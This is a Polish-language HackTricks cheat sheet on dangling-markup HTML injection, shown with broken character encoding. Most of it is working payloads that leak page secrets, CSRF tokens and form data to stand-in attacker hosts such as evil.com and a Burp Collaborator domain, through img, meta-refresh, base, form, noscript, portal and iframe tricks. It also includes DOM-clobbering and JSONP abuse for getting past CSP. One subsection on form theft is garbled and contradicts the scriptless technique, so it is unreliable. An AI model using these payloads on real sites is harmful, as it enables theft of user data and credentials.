# Dangling Markup - Wstrzykiwanie HTML bez uÅ¼ycia skryptÃ³w

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podsumowanie

Ta technika moÅ¼e byÄ‡ uÅ¼ywana do wydobycia informacji od uÅ¼ytkownika, gdy zostanie znalezione **wstrzykiwanie HTML**. Jest to bardzo przydatne, jeÅ›li **nie znajdziesz Å¼adnego sposobu na wykorzystanie** [**XSS**](../xss-cross-site-scripting/), ale moÅ¼esz **wstrzyknÄ…Ä‡ pewne znaczniki HTML**.\
Jest rÃ³wnieÅ¼ przydatne, jeÅ›li pewne **tajemnice sÄ… zapisane w postaci zwykÅ‚ego tekstu** w HTML i chcesz je **wydobyÄ‡** z klienta, lub jeÅ›li chcesz wprowadziÄ‡ w bÅ‚Ä…d wykonanie pewnego skryptu.

Kilka omÃ³wionych tutaj technik moÅ¼na uÅ¼yÄ‡ do obejÅ›cia niektÃ³rych [**Content Security Policy**](../content-security-policy-csp-bypass/) poprzez wydobywanie informacji w nieoczekiwany sposÃ³b (znaczniki HTML, CSS, http-meta tags, formularze, base...).

## GÅ‚Ã³wne zastosowania

### KradzieÅ¼ tajemnic w postaci zwykÅ‚ego tekstu

JeÅ›li wstrzykniesz `<img src='http://evil.com/log.cgi?` podczas Å‚adowania strony, ofiara wyÅ›le do Ciebie caÅ‚y kod miÄ™dzy wstrzykniÄ™tym znacznikiem `img` a nastÄ™pnym cudzysÅ‚owem w kodzie. JeÅ›li w tym fragmencie znajduje siÄ™ jakaÅ› tajemnica, jÄ… wykradniesz (moÅ¼esz zrobiÄ‡ to samo, uÅ¼ywajÄ…c podwÃ³jnego cudzysÅ‚owu, zobacz, ktÃ³ry moÅ¼e byÄ‡ bardziej interesujÄ…cy do uÅ¼ycia).

JeÅ›li znacznik `img` jest zabroniony (np. ze wzglÄ™du na CSP), moÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
ZauwaÅ¼, Å¼e **Chrome blokuje adresy URL HTTP** zawierajÄ…ce "<" lub "\n", wiÄ™c moÅ¼esz sprÃ³bowaÄ‡ innych schematÃ³w protokoÅ‚Ã³w, takich jak "ftp".

MoÅ¼esz rÃ³wnieÅ¼ wykorzystaÄ‡ CSS `@import` (wyÅ›le caÅ‚y kod do momentu znalezienia ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
MoÅ¼esz rÃ³wnieÅ¼ wstawiÄ‡ znacznik `<base`. Wszystkie informacje zostanÄ… wysÅ‚ane do zamkniÄ™cia cytatu, ale wymaga to pewnej interakcji uÅ¼ytkownika (uÅ¼ytkownik musi kliknÄ…Ä‡ w jakiÅ› link, poniewaÅ¼ znacznik base zmieniÅ‚ domenÄ™ wskazywanÄ… przez link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### KradzieÅ¼ formularzy

Dangling Markup (HTML) to technika, ktÃ³ra polega na wykorzystaniu niezamkniÄ™tego znacznika HTML, aby ukraÅ›Ä‡ dane z formularzy na stronie internetowej. Ta technika jest moÅ¼liwa, gdy deweloperzy nie zamknÄ… znacznika HTML poprawnie, co prowadzi do wycieku danych.

#### Jak dziaÅ‚a?

1. ZnajdÅº stronÄ™ internetowÄ… z niezamkniÄ™tym znacznikiem HTML w formularzu.
2. SprawdÅº, czy formularz zawiera poufne dane, takie jak hasÅ‚a, adresy e-mail, dane osobowe itp.
3. Wykorzystaj niezamkniÄ™ty znacznik HTML, aby wstrzyknÄ…Ä‡ kod JavaScript, ktÃ³ry przechwyci dane z formularza.
4. Skrypt JavaScript moÅ¼e wysÅ‚aÄ‡ skradzione dane na zewnÄ™trzny serwer lub zapisywaÄ‡ je w lokalnym pliku.

#### PrzykÅ‚ad

PoniÅ¼ej znajduje siÄ™ przykÅ‚ad niezamkniÄ™tego znacznika HTML w formularzu logowania:

```html
<form>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form
```

W powyÅ¼szym przykÅ‚adzie znacznik `</form>` nie zostaÅ‚ zamkniÄ™ty poprawnie. MoÅ¼emy wykorzystaÄ‡ tÄ™ lukÄ™, aby przechwyciÄ‡ dane logowania.

#### Zabezpieczenia

Aby zapobiec kradzieÅ¼y formularzy za pomocÄ… dangling markup, deweloperzy powinni zawsze upewniÄ‡ siÄ™, Å¼e wszystkie znaczniki HTML sÄ… zamkniÄ™te poprawnie. Regularne testowanie bezpieczeÅ„stwa aplikacji moÅ¼e rÃ³wnieÅ¼ pomÃ³c w wykrywaniu takich luk i ich naprawie przed wykorzystaniem ich przez potencjalnych hakerÃ³w.
```html
<base href='http://evil.com/'>
```
NastÄ™pnie, formularze wysyÅ‚ajÄ…ce dane do Å›cieÅ¼ki (np. `<form action='update_profile.php'>`) bÄ™dÄ… wysyÅ‚aÄ‡ dane do zÅ‚oÅ›liwej domeny.

### KradzieÅ¼ formularzy 2

Ustaw nagÅ‚Ã³wek formularza: `<form action='http://evil.com/log_steal'>` spowoduje nadpisanie nastÄ™pnego nagÅ‚Ã³wka formularza i wszystkie dane z formularza zostanÄ… wysÅ‚ane do atakujÄ…cego.

### KradzieÅ¼ formularzy 3

Przycisk moÅ¼e zmieniÄ‡ adres URL, do ktÃ³rego zostanÄ… wysÅ‚ane informacje z formularza, za pomocÄ… atrybutu "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
AtakujÄ…cy moÅ¼e wykorzystaÄ‡ to do kradzieÅ¼y informacji.

### KradzieÅ¼ jawnych sekretÃ³w 2

KorzystajÄ…c z najnowszej wymienionej techniki kradzieÅ¼y formularzy (wstrzykiwanie nowego nagÅ‚Ã³wka formularza), moÅ¼na nastÄ™pnie wstrzyknÄ…Ä‡ nowe pole wprowadzania danych:
```html
<input type='hidden' name='review_body' value="
```
i to pole wejÅ›ciowe bÄ™dzie zawieraÄ‡ caÅ‚Ä… treÅ›Ä‡ miÄ™dzy jego cudzysÅ‚owem a kolejnym cudzysÅ‚owem w HTML. Ten atak Å‚Ä…czy "_**KradzieÅ¼ jawnych sekretÃ³w**_" z "_**KradzieÅ¼Ä… formularzy2**_".

MoÅ¼esz zrobiÄ‡ to samo wstrzykujÄ…c formularz i znacznik `<option>`. Wszystkie dane do momentu znalezienia zamkniÄ™tego znacznika `</option>` zostanÄ… wysÅ‚ane:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Wstrzykiwanie parametrÃ³w formularza

MoÅ¼esz zmieniÄ‡ Å›cieÅ¼kÄ™ formularza i wstawiÄ‡ nowe wartoÅ›ci, aby wykonaÄ‡ nieoczekiwane dziaÅ‚anie:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### KradzieÅ¼ jawnych sekretÃ³w za pomocÄ… noscript

`<noscript></noscript>` to znacznik, ktÃ³rego zawartoÅ›Ä‡ zostanie zinterpretowana, jeÅ›li przeglÄ…darka nie obsÅ‚uguje JavaScriptu (moÅ¼esz wÅ‚Ä…czaÄ‡/wyÅ‚Ä…czaÄ‡ JavaScript w Chrome w [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Sposobem na wydostanie zawartoÅ›ci strony internetowej od punktu wstrzykniÄ™cia do jej koÅ„ca na kontrolowanÄ… przez atakujÄ…cego stronÄ™ bÄ™dzie wstrzykniÄ™cie tego:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Omijanie CSP za pomocÄ… interakcji uÅ¼ytkownika

Z tej [badania portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) moÅ¼na dowiedzieÄ‡ siÄ™, Å¼e nawet w **najbardziej ograniczonym Å›rodowisku CSP** wciÄ…Å¼ moÅ¼na **wyciekaÄ‡ dane** za pomocÄ… pewnej **interakcji uÅ¼ytkownika**. W tym przypadku bÄ™dziemy uÅ¼ywaÄ‡ Å‚adunku:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
ZauwaÅ¼, Å¼e poprosisz **ofiarÄ™** o **klikniÄ™cie w link**, ktÃ³ry jÄ… przekieruje do **payloadu** kontrolowanego przez ciebie. ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e atrybut **`target`** wewnÄ…trz tagu **`base`** bÄ™dzie zawieraÅ‚ **treÅ›Ä‡ HTML** do nastÄ™pnego pojedynczego cudzysÅ‚owu.\
Spowoduje to, Å¼e **wartoÅ›Ä‡** **`window.name`** po klikniÄ™ciu w link bÄ™dzie zawieraÄ‡ caÅ‚Ä… tÄ™ **treÅ›Ä‡ HTML**. Dlatego, jako Å¼e **kontrolujesz stronÄ™**, na ktÃ³rÄ… ofiara trafia po klikniÄ™ciu w link, moÅ¼esz uzyskaÄ‡ dostÄ™p do **`window.name`** i **wyciec** te dane:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### MylÄ…cy skrypt - krok 1 - Atak na przestrzeÅ„ nazw HTML

Wstaw nowy tag z identyfikatorem (id) wewnÄ…trz HTML, ktÃ³ry nadpisze nastÄ™pny tag i bÄ™dzie miaÅ‚ wartoÅ›Ä‡, ktÃ³ra wpÅ‚ynie na przebieg skryptu. W tym przykÅ‚adzie wybierasz, z kim zostanie udostÄ™pniona informacja:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### MylÄ…cy skrypt - Atak na przestrzeÅ„ nazw skryptu

UtwÃ³rz zmienne w przestrzeni nazw JavaScript poprzez wstawienie znacznikÃ³w HTML. NastÄ™pnie ta zmienna wpÅ‚ynie na przebieg aplikacji:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### Wykorzystanie JSONP

JeÅ›li znajdziesz interfejs JSONP, moÅ¼esz wywoÅ‚aÄ‡ dowolnÄ… funkcjÄ™ z dowolnymi danymi:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Lub nawet moÅ¼esz sprÃ³bowaÄ‡ wykonania pewnego kodu JavaScript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### NaduÅ¼ycie iframe

Dziecko dokumentu posiada zdolnoÅ›Ä‡ do przeglÄ…dania i modyfikowania wÅ‚aÅ›ciwoÅ›ci `location` swojego rodzica, nawet w przypadku sytuacji miÄ™dzydomenowych. Pozwala to na osadzenie skryptu wewnÄ…trz elementu **iframe**, ktÃ³ry moÅ¼e przekierowaÄ‡ klienta na dowolnÄ… stronÄ™:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
To moÅ¼na zÅ‚agodziÄ‡ uÅ¼ywajÄ…c czegoÅ› takiego jak: `sandbox=' allow-scripts allow-top-navigation'`

Iframe moÅ¼e rÃ³wnieÅ¼ byÄ‡ wykorzystane do wycieku poufnych informacji z innej strony **uÅ¼ywajÄ…c atrybutu nazwy iframe**. Dzieje siÄ™ tak, poniewaÅ¼ moÅ¼na utworzyÄ‡ iframe, ktÃ³re samo w sobie tworzy kolejne iframe, wykorzystujÄ…c wstrzykniÄ™cie HTML, ktÃ³re powoduje, Å¼e **poufne informacje pojawiajÄ… siÄ™ w atrybucie nazwy iframe**, a nastÄ™pnie moÅ¼na uzyskaÄ‡ do niej dostÄ™p z pierwotnego iframe i wyciec je.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta naduÅ¼ycie

MoÅ¼esz uÅ¼yÄ‡ **`meta http-equiv`** do wykonania **kilku dziaÅ‚aÅ„**, takich jak ustawienie pliku Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` lub przekierowanie (w tym przypadku po 5 sekundach): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

MoÅ¼na to **uniknÄ…Ä‡** za pomocÄ… **CSP** dotyczÄ…cego **http-equiv** (`Content-Security-Policy: default-src 'self';`, lub `Content-Security-Policy: http-equiv 'self';`)

### Nowy znacznik HTML \<portal>

MoÅ¼esz znaleÅºÄ‡ bardzo **ciekawe badania** na temat podatnoÅ›ci na wykorzystanie znacznika \<portal [tutaj](https://research.securitum.com/security-analysis-of-portal-element/).\
W chwili pisania tego tekstu musisz wÅ‚Ä…czyÄ‡ znacznik portal w Chrome pod adresem `chrome://flags/#enable-portals`, w przeciwnym razie nie bÄ™dzie dziaÅ‚aÄ‡.
```html
<portal src='https://attacker-server?
```
### Wycieki HTML

Nie wszystkie sposoby wycieku Å‚Ä…cznoÅ›ci w HTML bÄ™dÄ… przydatne dla Dangling Markup, ale czasami mogÄ… pomÃ³c. SprawdÅº je tutaj: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Wycieki SS

Jest to **mieszanka** miÄ™dzy **dangling markup a XS-Leaks**. Z jednej strony podatnoÅ›Ä‡ pozwala na **wstrzykniÄ™cie HTML** (ale nie JS) na stronie **tej samej domeny**, ktÃ³rÄ… bÄ™dziemy atakowaÄ‡. Z drugiej strony nie bÄ™dziemy **atakowaÄ‡** bezpoÅ›rednio strony, na ktÃ³rej moÅ¼emy wstrzyknÄ…Ä‡ HTML, ale **innej strony**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search jest skierowany na **wyciek informacji miÄ™dzydomenowych** poprzez wykorzystanie **atakÃ³w na kanaÅ‚y boczne**. Jest to zatem inna technika niÅ¼ Dangling Markup, jednak niektÃ³re z technik wykorzystujÄ… wÅ‚Ä…czenie znacznikÃ³w HTML (z i bez wykonania JS), takich jak [**Wstrzykiwanie CSS**](../xs-search.md#css-injection) lub [**OpÃ³Åºnione Å‚adowanie obrazÃ³w**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Lista wykrywania Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## OdwoÅ‚ania

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
